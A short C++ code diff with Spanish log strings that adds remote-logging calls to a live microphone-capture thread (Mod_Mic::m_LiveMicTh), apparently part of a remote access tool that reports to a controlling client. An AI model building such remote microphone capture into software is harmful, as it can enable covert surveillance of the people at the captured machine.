@@ -64,6 +64,8 @@ void Mod_Mic::m_DetenerLive() {
 void Mod_Mic::m_LiveMicTh() {
     std::string strMSG = "[!] thLiveMic iniciada, dispositivo#: ";
     _DBG_(strMSG, this->p_DeviceID);
+    cCliente->m_RemoteLog("[MIC] Iniciando live en dev: " + std::to_string(this->p_DeviceID));
+
     
     // Definir el formato de audio
     WAVEFORMATEX wfx = {};
@@ -82,6 +84,7 @@ void Mod_Mic::m_LiveMicTh() {
         strMSG = "Error abriendo ";
         strMSG += std::to_string(this->p_DeviceID);
         __DBG_(strMSG);
+        cCliente->m_RemoteLog("[MIC] Error abriendo dev: " + std::to_string(this->p_DeviceID));
         return;
     }
 
@@ -165,4 +168,6 @@ void Mod_Mic::m_LiveMicTh() {
 
     strMSG = "[!] thLiveMicTh finalizada";
     __DBG_(strMSG);
+
+    cCliente->m_RemoteLog("[MIC] Live finalizado");
 }
